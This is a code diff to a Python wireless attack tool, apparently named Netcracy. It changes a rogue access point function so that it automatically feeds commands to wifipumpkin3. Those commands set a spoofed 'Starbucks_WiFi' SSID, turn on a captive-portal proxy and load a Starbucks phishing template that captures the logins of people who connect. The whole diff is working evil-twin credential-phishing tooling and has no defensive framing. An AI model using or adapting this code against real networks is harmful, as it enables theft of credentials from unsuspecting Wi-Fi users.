@@ -67,19 +67,40 @@ def enforce_monitor_mode(interface):
 # ============================================================================
 #               COMMAND ENGINE EXECUTION FUNCTIONS
 # ============================================================================
-
 def handle_rogue_ap(args):
     target_device = args[0] if len(args) >= 1 else "wlan0"
     chosen_template = args[1] if len(args) >= 2 else "starbucks"
     chosen_ssid = args[2] if len(args) >= 3 else "Starbucks_WiFi"
     
     print(f"\n[+] Netcracy -> Initializing Rogue AP Subsystems...")
-    print(f"[*] Mapped Wireless Interface: {target_device}")
-    print(f"[*] Target Configuration Context: {chosen_template} | {chosen_ssid}")
-    time.sleep(1)
+    print(f"[*] Interface : {target_device}")
+    print(f"[*] Template  : {chosen_template}")
+    print(f"[*] SSID      : {chosen_ssid}\n")
     
-    cmd = f"sudo wifipumpkin3 -i {target_device}"
-    os.system(cmd)
+    auto_commands = f"set interface {target_device}\nset ssid {chosen_ssid}\nset proxy captiveflask\nset captiveflask.{chosen_template} true\nstart\n"
+    
+    process = subprocess.Popen(
+        ["sudo", "wifipumpkin3"],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True,
+        bufsize=1
+    )
+    
+    process.stdin.write(auto_commands)
+    process.stdin.flush()
+    
+    try:
+        for line in process.stdout:
+            clean_line = line.strip()
+            # Filter out the ASCII art and wp3> prompt, showing only live status logs
+            if any(tag in clean_line for tag in ["[+]", "[*]", "[-]", "[!]", "hostapd", "dhcpd", "captiveflask"]):
+                print(clean_line)
+    except KeyboardInterrupt:
+        print("\n[*] Stopping Rogue AP subsystems...")
+        process.terminate()
+        
     
 
 def handle_wlan0mon(args):
